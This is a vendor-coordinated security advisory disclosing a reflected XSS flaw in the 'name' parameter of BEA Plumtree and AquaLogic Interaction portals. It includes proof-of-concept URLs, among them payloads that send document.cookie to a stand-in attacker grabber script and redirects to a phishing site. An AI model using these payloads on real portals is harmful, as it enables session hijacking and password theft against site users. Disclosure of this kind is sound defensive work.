PR06-12: XSS on BEA Plumtree Foundation and AquaLogic Interaction portals


Description:

BEA Plumtree Foundation portal 6.0 and BEA AquaLogic Interaction 6.1 are 
vulnerable to a XSS vulnerability affecting the 'name' parameter which 
is submitted to the '/portal/server.pt' server-side script.

Date found: 12th September 2006

Vendor contacted: 18th May 2007

Successfully tested on: BEA Plumtree Foundation 6.0.1.218452.

BEA Systems have confirmed the following versions to be affected:

BEA Plumtree Foundation 6.0 through service pack 1.
BEA AquaLogic Interaction 6.1 through service pack 1.

BEA Plumtree 5.0J.173033, 5.02, 5.03 and 5.4 are not affected by this issue.


Severity: Medium-High


Authors: Jan Fry and Adrian Pastor of ProCheckUp Ltd (www.procheckup.com)

ProCheckUp thanks BEA Systems for their co-operation.

Proof of concept:

The following requests launch a JavaScript alert box on the user's web 
browser, simply to prove that is possible to run scripting code on the 
victim's web browser.

Please note that '%22;}%3C/script%3E' is added at the beginning of every 
payload in order to make the overall HTML document syntactically 
correct, thus increasing the chance of the attack working on different 
web browser types:

https://target-domain.foo/portal/server.pt?open=space&name=</SCRIPT><script>alert('CanCrossSiteScript')</script>
https://target-domain.foo/portal/server.pt?open=space&name=%22;}%3C/script%3E%3Cscript%3Ealert('CanCrossSiteScript')%3C/script%3E%3C!--


The following requests allow session hijacking through cookie theft:

https://target-domain.foo/portal/server.pt?open=space&name=</SCRIPT><script>window.location="http://attackers-site.foo/grabber.php?c="%2bdocument.cookie</script>
http://target-domain.foo/portal/server.pt?open=space&name=%22;}%3C/script%3E%3Cscript%3Ewindow.location="http://attackers-site.foo/grabber.php?c="%2bdocument.cookie%3C/script%3E%3C!--

The following requests allow password theft by redirecting to a 
third-party 'spoof' site which would perform a phishing attack on the 
victim:

https://target-domain.foo/portal/server.pt?open=space&name=</SCRIPT><script>window.location="http://phishers-site.foo"</script>
http://target-domain.foo/portal/server.pt?open=space&name=%22;}%3C/script%3E%3Cscript%3Ewindow.location="http://phishers-site.foo%3C/script%3E%3C!--

HTML injection through this XSS vulnerability is also possible. This 
allows advanced phishing attacks by inserting a HTML form within the 
context of the victim website.


Consequences:

Scripting code can be run within the security context of the target 
site. User accounts can be hijacked. Advanced phishing attacks can be 
launched.


Note:

This vulnerability could be considered a medium-high risk (rather than 
medium risk) in cases in which admin users are targeted, resulting in 
the attacker gaining administrative privileges on the target 
Plumtree/AquaLogic Portal.


Fix: this issue will be addressed in the 6.5 release of AquaLogic 
Interaction.
